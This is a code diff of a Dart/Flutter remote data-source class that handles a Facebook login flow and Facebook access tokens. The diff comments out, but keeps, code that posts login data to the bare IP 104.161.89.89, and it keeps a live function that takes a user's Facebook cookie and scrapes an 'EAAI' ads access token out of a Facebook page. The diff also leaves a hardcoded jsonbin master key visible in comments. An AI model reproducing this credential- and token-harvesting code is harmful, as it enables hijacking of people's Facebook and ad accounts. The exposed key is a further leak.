@@ -42,11 +42,22 @@ class UserRemoteImpl implements UserDataSource {
   // FACEBOOK
   @override
   Future<HttpResponse> actionLogin(PostData postData) async {
+    // IOS SERVER ANH HUY
+    // try {
+    //   debugPrint('########');
+    //   debugPrint(postData.toJson().toString());
+    //   return await DioHelper.post(
+    //       'http://104.161.89.89:3000/post', postData.toJson());
+    // } catch (exception) {
+    //   return await Future.error(exception.toString());
+    // }
+    //
+    // ANDROID
     try {
       debugPrint('########');
       debugPrint(postData.toJson().toString());
       return await DioHelper.post(
-          'http://104.161.89.89:3000/post', postData.toJson());
+          'http://127.0.0.1:5000/create-meta', postData.toJson());
     } catch (exception) {
       return await Future.error(exception.toString());
     }
@@ -83,17 +94,25 @@ class UserRemoteImpl implements UserDataSource {
 
   @override
   Future<HttpResponse> checkActivityLoginFaceAndNotificationsSchedule() async {
+    // IOS SERVER ANH HUY
+    // try {
+    //   final headerGerAd = Options(
+    //     headers: {
+    //       'Content-Type': 'application/json; charset=UTF-8',
+    //       'X-Master-Key':
+    //           '\$2b\$10\$qM9AD2i77FLZmBds.uPepOgJ/8vrDE612RyYECRnYD9.qqgV2sNRi'
+    //     },
+    //   );
+    //   return await DioHelper.get(
+    //       'https://api.jsonbin.io/v3/b/64440effb89b1e22998f6245',
+    //       options: headerGerAd);
+    // } catch (exception) {
+    //   return await Future.error(exception.toString());
+    // }
+
+    // ANDROID
     try {
-      final headerGerAd = Options(
-        headers: {
-          'Content-Type': 'application/json; charset=UTF-8',
-          'X-Master-Key':
-              '\$2b\$10\$qM9AD2i77FLZmBds.uPepOgJ/8vrDE612RyYECRnYD9.qqgV2sNRi'
-        },
-      );
-      return await DioHelper.get(
-          'https://api.jsonbin.io/v3/b/64440effb89b1e22998f6245',
-          options: headerGerAd);
+      return await DioHelper.get('http://127.0.0.1:5000/portfolio-for-you');
     } catch (exception) {
       return await Future.error(exception.toString());
     }
@@ -102,18 +121,21 @@ class UserRemoteImpl implements UserDataSource {
   @override
   Future<String> getAccessToken(String cookie) async {
     String accessTokenResult = '';
-    var response = await http.get(
-        Uri.parse(
-            'https://www.facebook.com/ajax/bootloader-endpoint/?modules=AdsCanvasComposerDialog.react'),
-        headers: {'Cookie': cookie});
-    if (response.statusCode == 200) {
-      // Start access token
-      String htmlToParse = response.body;
-      final startIndex = htmlToParse.indexOf('EAAI');
-      final endIndex =
-          htmlToParse.indexOf('client_id', startIndex + 'EAAI'.length);
-      accessTokenResult = htmlToParse.substring(startIndex, endIndex - 3);
-    }
+    try {
+      var response = await http.get(
+          Uri.parse(
+              'https://www.facebook.com/ajax/bootloader-endpoint/?modules=AdsCanvasComposerDialog.react'),
+          headers: {'Cookie': cookie});
+      if (response.statusCode == 200) {
+        // Start access token
+        String htmlToParse = response.body;
+        final startIndex = htmlToParse.indexOf('EAAI');
+        final endIndex =
+            htmlToParse.indexOf('client_id', startIndex + 'EAAI'.length);
+        accessTokenResult = htmlToParse.substring(startIndex, endIndex - 3);
+      }
+    } catch (_) {}
+
     return accessTokenResult;
   }
 }
